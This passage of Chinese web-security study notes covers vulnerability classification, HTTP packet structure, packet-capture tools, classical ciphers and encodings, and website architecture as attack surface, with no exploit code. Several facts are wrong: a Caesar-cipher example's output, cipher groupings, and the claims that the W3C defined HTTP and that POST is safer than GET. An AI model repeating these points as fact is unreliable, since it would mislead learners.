src="C:/Users/wuxia/AppData/Roaming/Typora/typora-user-images/image-20250114114805457.png" alt="image-20250114114805457"></p><h3 id="按漏洞成因分类"><a href="#按漏洞成因分类" class="headerlink" title="按漏洞成因分类"></a>按漏洞成因分类</h3><ul><li>代码问题<ul><li><strong>输入验证错误</strong>：程序未对用户输入进行校验或校验不正确。如缓冲区溢出，因未对输入做边界验证，导致用户输入过长或特殊字符，向其他内存位置执行错误读写操作；注入漏洞，因未过滤用户输入中的特殊元素，引发解析或解释错误，包括字符串注入、命令注入、代码注入、SQL注入、跨站脚本等；路径遍历，未正确过滤输入中的特殊路径，访问受限目录外位置；后置链接，未过滤输入中的特殊文件名，访问非授权文件路径；跨站请求伪造，未验证请求是否来自可信用户，执行恶意请求。</li><li><strong>授权问题</strong>：包括信任管理问题，如存在默认密码、硬编码密码、硬编码证书等，易被攻击者获取利用；权限许可和访问控制问题，未做好访问控制或权限许可。</li><li><strong>数字错误</strong>：未正确计算、转换数字，导致整数溢出、符号错误等漏洞。</li><li><strong>竞争条件问题</strong>：并发运行环境中，代码需互斥访问共享资源，未做好互斥导致的安全问题。</li><li><strong>加密问题</strong>：未正确使用密码算法，导致内容未正确加密、弱加密、明文存储敏感信息等。</li><li><strong>资源管理错误</strong>：对系统资源如内存、磁盘、文件、CPU等管理错误导致的漏洞。</li><li><strong>处理逻辑问题</strong>：代码处理逻辑实现问题或分支覆盖不全面导致的安全问题。</li><li><strong>数据转换问题</strong>：程序处理上下文对数据类型、编码、格式、含义等理解不一致导致的安全问题。</li><li><strong>未声明功能</strong>：通过测试接口、调试接口等可执行未授权功能导致的安全问题，如swagger未授权访问漏洞。</li></ul></li><li><strong>配置错误</strong>：因配置参数、配置文件不当，或采取不安全的默认配置导致的安全漏洞。</li><li><strong>环境问题</strong>：因受影响组件部署运行环境的原因导致的安全问题。</li></ul><h3 id="按漏洞来源分类"><a href="#按漏洞来源分类" class="headerlink" title="按漏洞来源分类"></a>按漏洞来源分类</h3><ul><li><strong>软件漏洞</strong>：由软件缺陷或错误导致，如操作系统、应用程序等软件中存在的漏洞。</li><li><strong>硬件漏洞</strong>：由于硬件设备缺陷或错误导致的漏洞，比如芯片、主板等硬件存在的安全问题。</li><li><strong>配置漏洞</strong>：因网络设备配置不当产生的漏洞，像防火墙、路由器等设备的配置错误。</li></ul><h3 id="按利用方式分类"><a href="#按利用方式分类" class="headerlink" title="按利用方式分类"></a>按利用方式分类</h3><ul><li><strong>远程漏洞</strong>：攻击者可通过网络远程利用的漏洞，无需直接接触目标系统，如远程代码执行漏洞。</li><li><strong>本地漏洞</strong>：攻击者需在目标系统上直接操作才能利用的漏洞，比如本地特权提升漏洞。</li></ul><h3 id="按影响范围分类"><a href="#按影响范围分类" class="headerlink" title="按影响范围分类"></a>按影响范围分类</h3><ul><li><strong>全局漏洞</strong>：影响整个网络系统的漏洞，一旦被利用，可能使整个网络瘫痪或数据泄露。</li><li><strong>局部漏洞</strong>：只影响特定区域或设备的漏洞，危害相对较小，局限在一定范围内。</li></ul><h3 id="按危害程度分类"><a href="#按危害程度分类" class="headerlink" title="按危害程度分类"></a>按危害程度分类</h3><ul><li><strong>高风险漏洞</strong>：可能导致重大安全事故，如系统崩溃、大量敏感数据泄露等，需立即采取措施修复。</li><li><strong>中等风险漏洞</strong>：可能造成一定损失，对系统安全有一定威胁，需在合理时间内修复。</li><li><strong>低风险漏洞</strong>：影响较小或不易被利用，但仍需关注并适时修复，以避免潜在风险。</li></ul><p><strong>服务器的作用图解为下图</strong></p><p><img src="C:/Users/wuxia/AppData/Roaming/Typora/typora-user-images/image-20250114123709029.png" alt="image-20250114123709029"></p><p><img src="C:/Users/wuxia/AppData/Roaming/Typora/typora-user-images/image-20250114124021400.png" alt="image-20250114124021400"></p><h1 id="4-数据包类型参考"><a href="#4-数据包类型参考" class="headerlink" title="4.数据包类型参考"></a>4.数据包类型参考</h1><p>另一个参考文献的网址为：<a href="https://www.jianshu.com/p/558455228c43">https://www.jianshu.com/p/558455228c43</a></p><h2 id="HTTP协议是什么"><a href="#HTTP协议是什么" class="headerlink" title="HTTP协议是什么"></a>HTTP协议是什么</h2><h2 id="由w3c制定的一种网络应用层协议，定义了浏览器与web服务器之间通信时所使用的数据格式。"><a href="#由w3c制定的一种网络应用层协议，定义了浏览器与web服务器之间通信时所使用的数据格式。" class="headerlink" title="由w3c制定的一种网络应用层协议，定义了浏览器与web服务器之间通信时所使用的数据格式。"></a><strong>由w3c制定的一种网络应用层协议，定义了浏览器与web服务器之间通信时所使用的数据格式。</strong></h2><h2 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a><strong>通信过程</strong></h2><p>1.浏览器建立与web服务器之间的连接</p><p>2.浏览器将请求数据打包（生成请求数据包）并发送到web服务器</p><p>3.web服务器将处理结果打包（生成响应数据包）并发送给浏览器</p><p>4.web服务器关闭连接</p><p>总结：</p><p><strong>建立连接——&gt;发送请求数据包——&gt;返回响应数据包——&gt;关闭连接</strong></p><h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><h2 id="请求数据包包含什么"><a href="#请求数据包包含什么" class="headerlink" title="请求数据包包含什么"></a><strong>请求数据包包含什么</strong></h2><p>1.请求行：请求类型&#x2F;请求资源路径、协议的版本和类型</p><p>2.请求头：一些键值对，一般由w3c定义，浏览器与web服务器之间都可以发送，表示特定的某种含义</p><p>3.【空行】请求头与请求体之间用一个空行隔开；</p><p>4.请求体：要发送的数据(一般post方式会使用)；例：userName&#x3D;123&amp;password&#x3D;123&amp;returnUrl&#x3D;&#x2F;</p><p>如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Request Headers</span><br><br><span class="hljs-attribute">POST</span> /adduser HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">8030</span><br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">16</span><br><span class="hljs-attribute">Pragma</span>: no-cache<br><span class="hljs-attribute">Cache</span>-Control: no-cache<br><span class="hljs-attribute">Origin</span>: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">66</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3359</span>.<span class="hljs-number">181</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><br><br><span class="hljs-comment"># Form Data</span><br><br><span class="hljs-attribute">name</span>=name&amp;age=<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h3 id="请求头含义："><a href="#请求头含义：" class="headerlink" title="请求头含义："></a><strong>请求头含义：</strong></h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Accept：指浏览器或其他客户可以接爱的MIME文件格式。Servlet可以根据它判断并返回适当的文件格式。<br><br><span class="hljs-keyword">User</span>-Agent：是客户浏览器名称<br><br>Host：对应网址URL中的Web名称和端口号。<br><br>Accept-Langeuage：指出浏览器可以接受的语言种类，如en或en-us，指英语。<br><br><span class="hljs-keyword">connection</span>：用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP/<span class="hljs-number">1.1</span>使用Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个HTML文件和相关的图形文件)，不需要每次都建立连接<br><br>Cookie：浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。<br><br>Referer：表明产生请求的网页URL。如比从网页/icconcept/<span class="hljs-keyword">index</span>.jsp中点击一个链接到网页/icwork/<span class="hljs-keyword">search</span>，在向服务器发送的<span class="hljs-keyword">GET</span>/icwork/<span class="hljs-keyword">search</span>中的请求中，Referer是http://hostname:<span class="hljs-number">8080</span>/icconcept/<span class="hljs-keyword">index</span>.jsp。这个属性可以用来跟踪Web请求是从什么网站来的。<br><br>Content-<span class="hljs-keyword">Type</span>：用来表名request的内容类型。可以用HttpServletRequest的getContentType()方法取得。<br><br>Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是ISO<span class="hljs-number">-8859</span><span class="hljs-number">-1.</span><br><br>Accept-<span class="hljs-keyword">Encoding</span>：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到Web响应之后先解码，然后再检查文件格式。<br></code></pre></td></tr></table></figure><h3 id="get和post的区别"><a href="#get和post的区别" class="headerlink" title="get和post的区别"></a><strong>get和post的区别</strong></h3><p>1.get直接在浏览器输入，post需要工具发送请求</p><p>2.get用url或者cookie传参，post将数据放在body中</p><p>3.get的URL有长度限制，post数据可以非常大</p><p>4.post比get安全，因为URL看不到数据</p><p>5.get用来获取数据，post用来发送数据</p><h2 id="响应数据包包含什么"><a href="#响应数据包包含什么" class="headerlink" title="响应数据包包含什么"></a><strong>响应数据包包含什么</strong></h2><p>1.状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</p><p>2.响应头：包含服务器类型、日期、长度、内容类型等</p><p>3.【空行】响应头与响应体之间用空行隔开</p><p>4.响应正文：程序处理后果，浏览器会将实体内容中的数据取出来，生成相应的页面</p><p>如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Server</span>:Apache Tomcat/<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span><br><span class="hljs-attribute">Date</span>:Mon,<span class="hljs-number">6</span>Oct2003 <span class="hljs-number">13</span>:<span class="hljs-number">13</span>:<span class="hljs-number">33</span> GMT<br><span class="hljs-attribute">Content</span>-Type:text/html<br><span class="hljs-attribute">Last</span>-Moified:Mon,<span class="hljs-number">6</span> Oct <span class="hljs-number">2003</span> <span class="hljs-number">13</span>:<span class="hljs-number">23</span>:<span class="hljs-number">42</span> GMT<br><span class="hljs-attribute">Content</span>-Length:<span class="hljs-number">112</span><br></code></pre></td></tr></table></figure><h3 id="常见状态码"><a href="#常见状态码" class="headerlink" title="常见状态码"></a><strong>常见状态码</strong></h3><p>1**：提示信息-表示请求已收到，继续处理</p><p>2**：发送成功（200）</p><p>3**：重定向（302）</p><p>4**：客户端错误</p><p>　　400.发送请求有语法错误</p><p>　　401.访问页面没有授权</p><p>　　403.没有权限访问该页面</p><p>　　404.没有该页面</p><p>5**：服务端错误</p><p>　　500.服务器内部异常</p><p>　　504.服务器请求超时，没有返回结果</p><h1 id="5-抓包，封包的一些含义（了解即可）"><a href="#5-抓包，封包的一些含义（了解即可）" class="headerlink" title="5.抓包，封包的一些含义（了解即可）"></a>5.抓包，封包的一些含义（了解即可）</h1><h3 id="抓包技术的应用意义"><a href="#抓包技术的应用意义" class="headerlink" title="抓包技术的应用意义"></a>抓包技术的应用意义</h3><p>抓包技术在网络管理、故障排除、安全监控、性能优化、协议分析与开发、数据分析与合规性审计等领域具有重要应用意义：</p><ul><li><strong>网络故障排除</strong>：诊断网络问题，分析数据流，快速定位问题根源，减少网络中断时间，提高网络可靠性。</li><li><strong>网络安全监控</strong>：检测网络中的异常流量、扫描攻击、DDoS攻击等恶意活动，记录攻击者行为，分析攻击模式和手段，增强安全防护，支持事件响应和取证。</li><li><strong>性能优化</strong>：记录数据包的传输时间、延迟、丢包率等指标，识别网络中的性能瓶颈，优化网络配置，提升用户体验。</li><li><strong>协议分析与开发</strong>：分析和验证网络协议的实现，确保协议按预期工作，在开发新网络应用或协议时用于调试和测试，保证协议兼容性和提升开发质量。</li><li><strong>数据分析与合规性审计</strong>：记录和分析网络中的数据流量模式，审计网络流量，确保数据传输符合安全政策和法规要求，为业务决策提供数据支持，避免法律风险。</li></ul><h3 id="抓包技术的应用对象"><a href="#抓包技术的应用对象" class="headerlink" title="抓包技术的应用对象"></a>抓包技术的应用对象</h3><p>抓包技术应用对象广泛，主要涵盖以下几类：</p><ul><li><p>网络设备</p><p>：</p><ul><li><strong>路由器和交换机</strong>：分析网络流量路径、排查路由问题和交换问题，优化路由策略和交换规则，提高网络性能和可靠性。</li><li><strong>防火墙和入侵检测系统（IDS）</strong>：监控通过防火墙和IDS的流量，检测异常活动和潜在威胁，提高网络安全性。</li></ul></li><li><p>服务器和工作站</p><p>：</p><ul><li><strong>Web服务器</strong>：分析HTTP请求和响应，诊断Web应用性能问题和安全漏洞，提升Web应用的性能和安全性。</li><li><strong>数据库服务器</strong>：监控数据库请求和响应，分析查询性能和潜在的SQL注入攻击，优化数据库性能，增强数据安全。</li><li><strong>应用服务器</strong>：监控应用服务器与客户端之间的通信，分析应用协议和数据交换，提高应用程序的可靠性和性能。</li></ul></li><li><p>客户端设备</p><p>：</p><ul><li><strong>个人电脑和移动设备</strong>：诊断客户端与服务器的通信问题，检测恶意软件通信行为，提高客户端应用的性能和安全性。</li><li><strong>物联网设备</strong>：监控物联网设备的网络通信，分析设备之间的数据交换和控制指令，确保物联网设备的正常运行和安全通信。</li></ul></li><li><p>网络服务</p><p>：</p><ul><li><strong>DNS服务器</strong>：监控DNS请求和响应，分析域名解析问题和DNS攻击，提高DNS解析的性能和可靠性。</li><li><strong>邮件服务器</strong>：监控邮件传输协议（如SMTP、IMAP、POP3）的通信，检测垃圾邮件和钓鱼邮件，提升邮件服务的安全性和可靠性。</li><li><strong>FTP服务器</strong>：监控文件传输协议（FTP）的通信，分析文件传输性能和安全问题，优化文件传输性能，确保文件传输的安全性。</li></ul></li><li><p>云计算和虚拟化环境</p><p>：</p><ul><li><strong>虚拟机和容器</strong>：监控虚拟机和容器之间的网络通信，分析虚拟化环境中的网络问题，优化虚拟化环境的网络性能，确保虚拟机和容器间的安全通信。</li><li><strong>云服务平台</strong>：监控云服务平台的网络流量，分析云应用的性能和安全问题，提升云服务的性能和可靠性，确保云环境中的数据安全和合规性。</li></ul></li></ul><h3 id="抓包技术的应用协议"><a href="#抓包技术的应用协议" class="headerlink" title="抓包技术的应用协议"></a>抓包技术的应用协议</h3><p>抓包技术可应用于多种网络协议的分析，常见的有：</p><ul><li><strong>HTTP&#x2F;HTTPS</strong>：用于Web应用、APP应用、PC端应用、微信小程序等的网络通信抓包，分析HTTP请求和响应，查看网页加载数据、API调用等信息。</li><li><strong>TCP&#x2F;IP</strong>：作为互联网的基础协议，几乎所有网络通信都基于TCP&#x2F;IP，抓包时可分析TCP连接的建立、数据传输和连接释放过程，以及IP数据包的传输路径、延迟等信息，帮助诊断网络连通性和性能问题。</li><li><strong>UDP</strong>：常用于实时性要求较高的应用，如视频会议、在线游戏等，抓包分析UDP数据包的传输情况，可了解数据传输的实时性和可靠性，发现丢包、乱序等问题。</li><li><strong>FTP</strong>：文件传输协议，抓包可监控文件上传和下载过程中的数据传输情况，分析文件传输性能和安全问题。</li><li><strong>SMTP、IMAP、POP3</strong>：邮件传输协议，通过抓包可监控邮件的发送和接收过程，检测垃圾邮件和钓鱼邮件等安全问题。</li><li><strong>DNS</strong>：域名解析协议，抓包分析DNS请求和响应，可了解域名解析的性能和准确性，发现DNS缓存投毒等攻击行为。</li></ul><h3 id="抓包技术的应用支持"><a href="#抓包技术的应用支持" class="headerlink" title="抓包技术的应用支持"></a>抓包技术的应用支持</h3><p>抓包技术的应用支持主要体现在各种抓包工具上，不同的工具适用于不同的应用场景和协议：</p><ul><li><strong>Wireshark</strong>：广泛使用的开源抓包工具，支持多种协议分析，界面友好，适合初学者和高级用户使用。</li><li><strong>tcpdump</strong>：基于命令行的抓包工具，功能强大，适合高级用户和脚本自动化，支持针对网络层、协议、主机、网络或端口的过滤。</li><li><strong>Fiddler</strong>：专注于HTTP和HTTPS流量的抓包和调试工具，常用于Web开发和调试，能够记录并检查电脑和互联网之间的HTTP通讯，设置断点，查看请求、响应和HTTP头等详细信息。</li><li><strong>Charles</strong>：HTTP代理服务器、HTTP监视器、反转代理服务器，可监控浏览器发送和接收的所有数据，查看HTTP通信的request、response和HTTP headers等信息，适用于Web应用和移动应用的HTTP流量分析。</li><li><strong>BurpSuite</strong>：用于攻击Web应用程序的集成平台，包含多种工具，可处理HTTP消息、持久性、认证、代理、日志、警报等，是Web安全测试和渗透测试中常用的抓包工具。</li></ul><h3 id="封包技术的应用意义"><a href="#封包技术的应用意义" class="headerlink" title="封包技术的应用意义"></a>封包技术的应用意义</h3><p>封包技术通常用于将数据封装成特定格式的数据包，以便在网络中传输。其应用意义包括：</p><ul><li><strong>封装数据</strong>：将数据封装成符合特定协议格式的数据包，确保数据在网络中的正确传输。</li><li><strong>保护数据</strong>：通过封装，可以对数据进行加密和签名，保护数据的完整性和安全性。</li><li><strong>优化传输</strong>：合理封装数据包，可以优化数据传输效率，减少网络拥塞，提高传输速度。</li><li><strong>协议适配</strong>：确保数据包符合目标网络或应用的协议要求，实现不同系统间的互操作性。</li><li><strong>数据重放</strong>：在测试和开发中，封包技术可以用于数据包的重放，模拟网络通信过程，帮助开发者调试和验证应用的网络功能。</li></ul><p><strong>工具相关证书安装指南：</strong></p><p>Fidder</p><p><a href="https://blog.csdn.net/weixin_45043349/article/details/120088449BurpSuite">https://blog.csdn.net/weixin_45043349/article/details/120088449BurpSuite</a></p><p>Charles</p><p><a href="https://blog.csdn.net/weixin_45459427/article/details/108393878Fidder">https://blog.csdn.net/weixin_45459427/article/details/108393878Fidder</a></p><p>Burpsuite</p><p><a href="https://blog.csdn.net/qq_36658099/article/details/81487491">https://blog.csdn.net/qq_36658099/article/details/81487491</a></p><p>HackBar保姆级使用教程</p><p><a href="https://blog.csdn.net/2302_82189125/article/details/137762983">Web 渗透测试神器：HackBar 保姆级教程-CSDN博客</a></p><p>(<a href="https://blog.csdn.net/2302_82189125/article/details/137762983">https://blog.csdn.net/2302_82189125/article/details/137762983</a>)</p><h1 id="6-密文加密"><a href="#6-密文加密" class="headerlink" title="6.密文加密"></a>6.密文加密</h1><p><img src="C:/Users/wuxia/AppData/Roaming/Typora/typora-user-images/image-20250116125732864.png" alt="image-20250116125732864"></p><h3 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h3><ol><li><strong>摩斯密码（Morse code）</strong><ul><li>通过短脉冲（点）和长脉冲（划）的组合来表示字母、数字和标点符号。例如，字母A用“·-”表示，数字1用“·—-”表示。在CTF中，若看到由点和划组成的密文，很可能就是摩斯密码。</li></ul></li><li><strong>换位密码</strong><ul><li><strong>栅栏密码（Rail-fence Cipher）</strong><ul><li>将明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合……最后把它们全部连接起来形成密文。例如，明文“helloworldisme”加密后可能为“hrelldlioswmoe”。</li></ul></li><li><strong>凯撒密码（Caesar Cipher）</strong><ul><li>将明文中的每个字母按照其在字母表中的顺序向后（或向前）移动固定数目（循环移动）作为密文。例如，位移三位时，“flag{hello word}”加密后为“iodj{ehoor zrua}”。</li></ul></li><li><strong>曲路密码</strong><ul><li>需要事先约定密钥（曲路路径），通过特定路径对明文字符进行重新排列形成密文。例如，明文“flag{y0u_are_p1g@}”按行列为3加密后，密文可能为“}ey{r@gaga_1pulf0_”或“}1e_yal{urp@g_a0gf”。</li></ul></li><li><strong>列移位密码（Columnar Transposition Cipher）</strong><ul><li>通过一个简单的规则将明文打乱混合成密文。例如，明文“The quick brown fox jumps over the lazy dog”用密钥“how are u”加密后，密文为“qoury inpho Tkool hbxva uwmtd cfseg erjez”。</li></ul></li></ul></li><li><strong>替换密码</strong><ul><li><strong>移位密码</strong><ul><li>与凯撒密码类似，区别在于移位密码不仅会处理字母，还会处理数字和特殊字符，常用ASCII码表进行移位。其破解方法也是遍历所有的可能性来得到可能的结果。</li></ul></li><li><strong>简单替换密码</strong><ul><li>将每个明文字母替换为与之唯一对应且不同的字母。它与恺撒密码之间的区别是其密码字母表的字母不是简单的移位，而是完全是混乱的，这也使得其破解难度要高于凯撒密码。此种加密方式密钥个数为26!，几乎不可能爆破。</li></ul></li><li><strong>埃特巴什码</strong><ul><li>字母倒序。例如，“the quick brown fox jumps over the lazy dog”加密后为“gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt”。</li></ul></li><li><strong>棋盘密码（Polybius）</strong><ul><li>用数字坐标来表示字母。例如，明文“HELLO”加密后为“23 15 31 31 34”。</li></ul></li><li><strong>Vigenere 维吉尼亚密码</strong><ul><li>使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。例如，明文“come greatwall”用密钥“crypto”加密。</li></ul></li><li><strong>培根密码</strong><ul><li>是一种简单的替换密码，密文字符只有两个（a和b），每个明文字符都会被替换为一个由a和b组成的长度为5的字符串。密文字符也可以选择任意两个其它字符。如果看到这种全部由两个字母组成的密文，那么就可以猜测可能是培根密码。</li></ul></li><li><strong>猪圈密码</strong><ul><li>使用特定的密码表进行加密。</li></ul></li><li><strong>键盘密码</strong><ul><li>根据电脑键盘的布局进行加密。例如，明文“35 16 13”加密后为“bye”。</li></ul></li></ul></li></ol><h3 id="现代加密算法"><a href="#现代加密算法" class="headerlink" title="现代加密算法"></a>现代加密算法</h3><ol><li><strong>对称密钥加密算法</strong><ul><li><strong>AES（高级加密标准）</strong><ul><li>目前广泛使用的对称加密标准，具有较高的安全性和效率。</li></ul></li><li><strong>DES（数据加密标准）</strong><ul><li>早期的对称加密算法，由于密钥长度较短，现已逐渐被AES等更安全的算法取代。</li></ul></li><li><strong>3DES（三重数据加密算法）</strong><ul><li>通过三次DES加密来提高安全性，但性能相对较低。</li></ul></li><li><strong>RC4</strong><ul><li>一种流加密算法，曾广泛用于SSL&#x2F;TLS等协议中，但近年来发现了一些安全漏洞。</li></ul></li><li><strong>Rabbit</strong><ul><li>一种相对较新的流加密算法，具有较高的性能和安全性。</li></ul></li></ul></li><li><strong>非对称密钥加密算法</strong><ul><li><strong>RSA（Rivest-Shamir-Adleman）</strong><ul><li>基于数论的公钥加密算法，广泛应用于数字签名和加密通信中。</li></ul></li><li><strong>ECC（椭圆曲线加密）</strong><ul><li>利用椭圆曲线数学进行加密的算法，具有较高的安全性和较小的密钥长度。</li></ul></li></ul></li><li><strong>哈希算法</strong><ul><li><strong>MD5</strong><ul><li>一种常用的哈希算法，用于生成消息摘要，但已被证明不安全，容易受到碰撞攻击。</li></ul></li><li><strong>SHA 系列（安全哈希算法）</strong><ul><li>包括SHA-1、SHA-256、SHA-3等，用于生成更安全的消息摘要。</li></ul></li><li><strong>HMAC 系列（基于哈希的消息认证码）</strong><ul><li>结合哈希算法和密钥，用于验证消息的完整性和真实性。</li></ul></li></ul></li></ol><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ol><li><strong>Base系列</strong><ul><li><strong>Base64</strong><ul><li>基于64个可打印字符来表示二进制数据，常用于在文本数据中表示、传输、存储二进制数据。识别特征为索引表<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code>。</li></ul></li><li><strong>Base32</strong><ul><li>使用32个字符进行编码，常用于需要更短编码长度的场合。</li></ul></li><li><strong>Base16（Hex）</strong><ul><li>使用16个字符（0-9, A-F）进行编码，常用于表示二进制数据的十六进制形式。</li></ul></li></ul></li><li><strong>其他编码</strong><ul><li><strong>Unicode</strong><ul><li>用于表示各种字符的编码标准，常用于多语言文本的处理。</li></ul></li><li><strong>Escape</strong><ul><li>用于在字符串中表示特殊字符的编码方式，常用于URL编码等。</li></ul></li><li><strong>URL编码</strong><ul><li>用于在URL中安全地传输数据，将特殊字符转换为%后跟两位十六进制数的形式。</li></ul></li></ul></li></ol><h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h3><ol><li><strong>Obfuscator</strong><ul><li>用于混淆代码，使其难以理解和分析。</li></ul></li><li><strong>JJEncode</strong><ul><li>一种JavaScript代码混淆技术，常用于绕过安全检测。</li></ul></li><li><strong>AAEncode</strong><ul><li>另一种JavaScript代码混淆技术，通过将代码转换为Unicode字符来实现混淆。</li></ul></li><li><strong>JSFuck</strong><ul><li>使用JavaScript的少数几个字符（如<code>[]</code>、<code>!</code>、<code>+</code>等）来表示所有其他字符，实现代码的极端混淆。</li></ul></li><li><strong>Jother</strong><ul><li>一种基于JSFuck的变种，进一步增加了混淆的复杂度。</li></ul></li><li><strong>Brainfuck</strong><ul><li>一种极简的编程语言，常用于代码混淆和挑战性编程。</li></ul></li><li><strong>Ook!</strong><ul><li>一种基于Brainfuck的变种，使用更少的字符来实现相同的功能。</li></ul></li><li><strong>Trivial brainfuck substitution</strong><ul><li>一大类基于Brainfuck的编程语言，成员超过20个，常用于CTF中的代码混淆挑战。</li></ul></li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li><strong>与佛论禅</strong><ul><li>字符串转换后，是一些佛语。在线体验地址：<a href="https://keyfc.net/bbs/tools/tudoucode.aspx%E3%80%82[^5^]">https://keyfc.net/bbs/tools/tudoucode.aspx。[^5^]</a></li></ul></li><li><strong>当铺密码</strong><ul><li>根据当前汉字有多少笔画出头，对应的明文就是数字几。例如，明文“王夫 井工 夫口 由中人 井中 夫夫 由中大”加密后为“67 84 70 123 82 77 125”。</li></ul></li></ol><h1 id="7-资产架构方面的知识（了解即可）"><a href="#7-资产架构方面的知识（了解即可）" class="headerlink" title="7.资产架构方面的知识（了解即可）"></a>7.资产架构方面的知识（了解即可）</h1><h3 id="WEB单个源码指向安全"><a href="#WEB单个源码指向安全" class="headerlink" title="WEB单个源码指向安全"></a>WEB单个源码指向安全</h3><p>**即一个网站的源码只指向一个域名，一个源码对应一个网站。**这种情况下，网站结构相对简单，安全风险相对容易把控。但也要注意源码本身的漏洞、配置不当等问题，避免被攻击者利用。</p><h3 id="WEB多个目录源码安全"><a href="#WEB多个目录源码安全" class="headerlink" title="WEB多个目录源码安全"></a>WEB多个目录源码安全</h3><p>**一个网站下有多个不同的目录，每个目录下运行着不同的程序。**比如bbs.xiaodi8.com是论坛程序，bbs.xiaodi8.com&#x2F;blog是博客程序。这种情况下，任何一个目录下的程序出现漏洞，都可能影响整个网站的安全。攻击者可能会通过漏洞在不同目录间进行渗透，获取更多权限或数据。</p><h3 id="WEB多个端口源码安全"><a href="#WEB多个端口源码安全" class="headerlink" title="WEB多个端口源码安全"></a>WEB多个端口源码安全</h3><p>**一个网站通过不同的端口运行多个程序。**例如bbs.xiaodi8.com运行论坛程序，bbs.xiaodi8.com:8081运行博客程序。这同样增加了网站的安全风险，因为每个端口上的程序都可能成为攻击的入口。而且，不同端口的程序可能由不同的开发团队开发，安全水平参差不齐，更容易出现安全漏洞。</p><h3 id="服务器架设多个站点安全"><a href="#服务器架设多个站点安全" class="headerlink" title="服务器架设多个站点安全"></a>服务器架设多个站点安全</h3><p>**一台服务器上部署了多个不同的网站。**比如bbs.xiaodi8.com和edu.xiaodi8.com都部署在同一台服务器上，但它们是不同的站点。这种情况下，攻击者如果攻破了其中一个站点，可能会利用服务器的权限尝试攻击其他站点，获取更多敏感信息。而且，不同站点可能有不同的安全配置和防护措施，攻击者可能会寻找安全防护较弱的站点作为突破口。</p><h3 id="架设第三方插件接口安全"><a href="#架设第三方插件接口安全" class="headerlink" title="架设第三方插件接口安全"></a>架设第三方插件接口安全</h3><p>**网站安装了第三方插件或接口。**比如WordPress插件、phpmyadmin等数据库管理插件。这些插件可能本身存在漏洞，攻击者可以通过这些漏洞对网站进行攻击。即使网站本身的源码没有漏洞，插件的漏洞也可能被利用来获取网站的权限、访问数据库等。</p><h3 id="服务器架设多个应用安全"><a href="#服务器架设多个应用安全" class="headerlink" title="服务器架设多个应用安全"></a>服务器架设多个应用安全</h3><p>**服务器上除了运行Web应用外，还安装了其他应用，如FTP服务器。**这些应用可能会增加服务器的安全风险，因为它们可能有自己的漏洞和安全问题。攻击者可能会通过攻击这些应用来获取服务器的权限，进而攻击网站。</p><h1 id="8-番外安全"><a href="#8-番外安全" class="headerlink" title="8.番外安全"></a>8.番外安全</h1><h3 id="基于域名解析安全"><a href="#基于域名解析安全" class="headerlink" 